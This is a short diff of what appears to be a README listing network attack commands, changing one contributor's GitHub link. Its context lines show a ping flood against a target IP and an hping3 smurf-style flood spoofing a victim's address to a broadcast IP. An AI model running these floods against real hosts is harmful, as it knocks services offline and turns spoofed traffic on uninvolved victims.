@@ -91,7 +91,7 @@ sudo ping -f -s 65500 <Target IP>
 sudo hping3 -1 --flood -a <Victim IP> <Broadcast IP>
 ```
 ## Other contributors
-* [Chaitanya kumar](https://github.com/Jackson2398)
+* [Chaitanya kumar](https://github.com/ckumar2398)
 * [Aditya Choudary](https://github.com/adityachd123)
 * [Kapil Dev](https://github.com/kapilDev1)
 * [Ayushi Sharma](https://www.google.com)
